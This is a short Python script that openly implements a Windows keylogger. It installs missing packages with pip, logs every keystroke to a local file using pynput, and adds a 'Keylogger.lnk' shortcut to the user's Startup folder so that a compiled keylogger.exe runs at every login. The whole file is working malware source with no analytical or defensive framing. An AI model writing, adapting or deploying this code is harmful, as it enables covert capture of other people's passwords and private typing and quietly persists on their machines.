import subprocess
import sys
import os

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install():
    packages = ['pywin32', 'pynput', 'plyer'] 
    for package in packages:
        try:
            __import__(package)  
        except ImportError:
            install(package)  


check_and_install()


import win32com.client
from pynput.keyboard import Key, Listener
from plyer import notification

log_file = "key_log.log"
log_content = ""

def on_press(key):
    global log_content
    try:
        if key.char:
            log_content += key.char  
    except AttributeError:
        if key == Key.backspace:
            log_content = log_content[:-1]
        else:
            log_content += f" {key} "

    with open(log_file, "w") as f:
        f.write(log_content)

def on_release(key):
    if key == Key.esc:
        return False

def create_startup_shortcut():
    keylogger_path = os.path.join(os.path.dirname(sys.executable), "dist", "keylogger.exe")
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(os.path.join(startup_folder, "Keylogger.lnk"))
    shortcut.TargetPath = keylogger_path
    shortcut.WorkingDirectory = os.path.dirname(keylogger_path)
    shortcut.save()


create_startup_shortcut()


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
